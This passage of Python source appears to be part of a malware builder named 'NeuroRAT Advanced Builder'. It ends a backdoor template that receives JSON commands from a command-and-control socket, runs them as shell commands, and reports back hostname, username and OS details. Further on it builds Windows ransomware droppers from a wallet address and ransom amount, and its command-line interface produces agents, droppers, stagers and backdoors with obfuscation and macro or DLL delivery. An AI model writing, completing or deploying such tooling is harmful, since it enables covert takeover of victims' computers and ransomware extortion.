                    line, buffer = buffer.split(b'\n', 1)
                    try:
                        command_data = json.loads(line.decode())
                        logger.info(f"Received command: {command_data}")

                        # Execute command (assuming command_data is a dict with 'command' and 'parameters')
                        command = command_data.get("command")
                        parameters = command_data.get("parameters", {})
                        if command:
                            result = self.execute_command(command, parameters)
                            # Send result back (as JSON)
                            sock.send((json.dumps(result) + "\n").encode())
                        else:
                            logger.warning(f"Received command data without 'command' field: {command_data}")
                            sock.send((json.dumps({"status": "error", "message": "No command specified"}) + "\n").encode())

                    except json.JSONDecodeError:
                        logger.error(f"Failed to parse JSON command: {line.decode()}")
                        sock.send((json.dumps({"status": "error", "message": "Invalid JSON command"}) + "\n").encode())
                    except Exception as e:
                         logger.error(f"Error processing command '{line.decode()}': {e}")
                         sock.send((json.dumps({"status": "error", "message": f"Processing error: {e}"}) + "\n").encode())

            except socket.timeout:
                 pass # Timeout is expected if no data is received, just continue loop
            except Exception as e:
                logger.error(f"Error in handle_commands: {e}")
                break # Exit command handling loop on error

    def execute_command(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        # Execute system command or other agent-specific commands
        logger.info(f"Executing command '{command}' with parameters {parameters} (placeholder).")
        try:
            if command == "execute_shell":
                shell_command = parameters.get("command")
                if not shell_command:
                     return {"status": "error", "output": "No shell command specified."}
                # Execute system command using subprocess
                result = subprocess.run(
                    shell_command,
                    shell=True, # Use shell=True for simplicity, but be cautious with input
                    capture_output=True,
                    text=True, # Capture output as text
                    timeout=60 # Add a timeout
                )
                return {"status": "completed", "output": result.stdout, "error": result.stderr, "returncode": result.returncode}
            elif command == "system_info":
                 # Collect system info (placeholder)
                 info = {
                     "platform": platform.system(),
                     "hostname": socket.gethostname(),
                     "username": os.getlogin(),
                     "os_version": platform.version(),
                     "architecture": platform.machine(),
                     "processor": platform.processor(),
                     "pid": os.getpid()
                 }
                 return {"status": "completed", "output": info}
            # Add other agent commands here (e.g., download, upload, scan, persist)
            else:
                return {"status": "error", "output": f"Unknown command: {command}"}

        except FileNotFoundError:
             return {"status": "error", "output": f"Command not found: {command.split()[0]}"}
        except subprocess.TimeoutExpired:
             return {"status": "failed", "output": f"Command timed out after 60 seconds."}
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return {"status": "error", "output": f"Execution error: {e}"}


if __name__ == "__main__":
    # Start backdoor
    # Configure basic logging for the backdoor (optional)
    # logging.basicConfig(level=logging.INFO, format='%(asctime)s - BACKDOOR - %(levelname)s - %(message)s')
    backdoor = Backdoor()
    backdoor.run()
"""

    def build_ransomware_dropper(self, wallet_address: str, ransom_amount: str = "0.05 BTC") -> Tuple[bool, str]:
        """
        Собирает ransomware dropper для Windows с заданным кошельком и суммой выкупа
        """
        logger.info(f"Building ransomware dropper for Windows with wallet {wallet_address} and amount {ransom_amount}")
        try:
            # Assuming a template specifically for the ransomware dropper exists
            template_path = TEMPLATES_DIR / "ransomware_dropper_windows.py"

            if not template_path.exists():
                 return False, f"Ransomware dropper template not found at {template_path}"

            with open(template_path, 'r') as f:
                template_code = f.read()

            # Replace placeholders specific to the ransomware dropper
            code = template_code.replace("{{WALLET_ADDRESS}}", wallet_address).replace("{{RANSOM_AMOUNT}}", ransom_amount)

            # Determine output path
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            # Create a filename based on wallet address for easy identification
            output_filename = f"ransomware_dropper_win_{wallet_address[:8]}.py" # Save as .py for now, could compile later
            output_path = str(OUTPUT_DIR / output_filename)

            # Write the generated code to the output file
            with open(output_path, 'w') as f:
                f.write(code)

            logger.info(f"Ransomware dropper source built: {output_path}")
            # Note: This only builds the source .py file. Compilation into .exe would require
            # calling _compile_for_platform with platform="windows" and delivery="executable".
            # For this specific function, we'll just build the source for now as per original code.
            return True, output_path
        except Exception as e:
            logger.error(f"Ошибка при сборке ransomware dropper: {e}")
            return False, str(e)


# Example of how to use the builder (for testing/demonstration)
if __name__ == "__main__":
    # Create dummy template files for testing if they don't exist
    os.makedirs(TEMPLATES_DIR, exist_ok=True)
    for platform in TEMPLATES:
        template_file = TEMPLATES_DIR / TEMPLATES[platform]
        if not template_file.exists():
             print(f"Creating dummy template: {template_file}")
             with open(template_file, "w") as f:
                 f.write(f"#!/usr/bin/env python3\n# Placeholder template for {platform}\nC2_SERVER = \"{{C2_SERVER}}\"\nC2_PORT = {{C2_PORT}}\n")

    # Create a dummy builder config file if it doesn't exist
    os.makedirs(DEFAULT_CONFIG_PATH.parent, exist_ok=True)
    if not DEFAULT_CONFIG_PATH.exists():
        print(f"Creating dummy config: {DEFAULT_CONFIG_PATH}")
        default_config_content = {
                "output_dir": str(OUTPUT_DIR),
                "template_dir": str(TEMPLATES_DIR),
                "obfuscation_level": 1,
                "c2_server": "localhost",
                "c2_port": 8080,
                "platforms": ["windows", "linux", "macos"],
                "payload_types": ["agent", "dropper", "stager", "backdoor"],
                "delivery_methods": ["executable"],
                "encryption": {"enabled": False},
                "anti_detection": {"sandbox_detection": False},
                "network": {"protocols": ["https"]},
                "compilation": {"strip_symbols": True}
        }
        with open(DEFAULT_CONFIG_PATH, "w") as f:
             json.dump(default_config_content, f, indent=4)

    # --- Command line interface logic (adapted from original main) ---
    # This part allows running the builder from the command line for testing

    parser = argparse.ArgumentParser(description="NeuroRAT Advanced Builder")
    parser.add_argument("--config", help="Path to configuration file", type=Path, default=DEFAULT_CONFIG_PATH)
    parser.add_argument("--platform", choices=["windows", "linux", "macos"], help="Target platform")
    parser.add_argument("--payload", choices=["agent", "dropper", "stager", "backdoor", "ransomware_dropper"], help="Payload type")
    parser.add_argument("--delivery", choices=["executable", "script", "dll", "macro"], help="Delivery method")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--obfuscation", type=int, choices=[0, 1, 2, 3], help="Obfuscation level")
    parser.add_argument("--c2-server", help="C2 server address")
    parser.add_argument("--c2-port", type=int, help="C2 server port")
    parser.add_argument("--create-template", action="store_true", help="Create a new template")
    parser.add_argument("--wallet-address", help="Wallet address for ransomware dropper")
    parser.add_argument("--ransom-amount", help="Ransom amount for ransomware dropper", default="0.05 BTC")

    args = parser.parse_args()

    # Инициализация билдера
    builder = AdvancedBuilder(args.config)

    if args.create_template:
        if not args.platform or not args.payload:
            print("Error: Platform and payload type required for template creation")
            sys.exit(1)

        # Note: create_template in original code created templates based on hardcoded strings,
        # not based on existing minimal templates.
        # The current AdvancedBuilder class logic pulls from _get_*_template methods,
        # so creating templates might involve writing these methods' output to files.
        # Let's adapt to create a template file from the internal templates.

        template_type = args.payload
        target_platform = args.platform
        try:
            template_code = ""
            if template_type == "agent":
                template_code = builder._get_agent_template()
            elif template_type == "dropper":
                template_code = builder._get_dropper_template()
            elif template_type == "stager":
                template_code = builder._get_stager_template()
            elif template_type == "backdoor":
                template_code = builder._get_backdoor_template()
            elif template_type == "ransomware_dropper":
                 # Note: The ransomware template is hardcoded in build_ransomware_dropper, not a separate getter
                 print("Ransomware dropper template creation is not supported via this option.")
                 sys.exit(1)
            else:
                print(f"Error: Unsupported template type for creation: {template_type}")
                sys.exit(1)

            # Add platform-specific code to the template code
            if target_platform == "windows":
                 template_code = builder._add_windows_specific(template_code)
            elif target_platform == "linux":
                 template_code = builder._add_linux_specific(template_code)
            elif target_platform == "macos":
                 template_code = builder._add_macos_specific(template_code)


            # Define the path where the new template file will be saved
            # Using the builder's template_dir configuration
            template_output_dir = Path(builder.config.get("template_dir", TEMPLATES_DIR))
            os.makedirs(template_output_dir, exist_ok=True) # Ensure directory exists
            template_output_path = template_output_dir / f"{template_type}_{target_platform}_template.py"

            with open(template_output_path, "w") as f:
                 f.write(template_code)

            print(f"Template created successfully: {template_output_path}")

        except Exception as e:
            print(f"Error creating template: {e}")
            sys.exit(1)


    else:
        # Настройки сборки
        settings = {}

        # Use argparse values, fallback to config, then defaults
        settings["platform"] = args.platform or builder.config.get("platforms", [None])[0]
        settings["payload_type"] = args.payload or builder.config.get("payload_types", [None])[0]
        settings["delivery_method"] = args.delivery or builder.config.get("delivery_methods", [None])[0]
        settings["c2_server"] = args.c2_server or builder.config.get("c2_server", DEFAULT_C2_SERVER)
        settings["c2_port"] = args.c2_port or builder.config.get("c2_port", DEFAULT_C2_PORT)
        settings["obfuscation_level"] = args.obfuscation if args.obfuscation is not None else builder.config.get("obfuscation_level", 0)


        # Handle ransomware_dropper specifically if requested via --payload
        if settings["payload_type"] == "ransomware_dropper":
             if not args.wallet_address:
                  print("Error: --wallet-address is required for ransomware_dropper payload.")
                  sys.exit(1)
             settings["wallet_address"] = args.wallet_address
             settings["ransom_amount"] = args.ransom_amount # Use default if not provided

             # Call the specific ransomware build method
             success, result = builder.build_ransomware_dropper(
                  wallet_address=settings["wallet_address"],
                  ransom_amount=settings["ransom_amount"]
             )
        else:
            # Basic payload build
            success, result = builder.build_payload(settings)

        if success:
            print(f"Payload built successfully: {result}")
        else:
            print(f"Build failed: {result}")
            sys.exit(1)

# This main block is typically used for command line execution.
# When integrated as a module, you would import and use the AdvancedBuilder class directly. 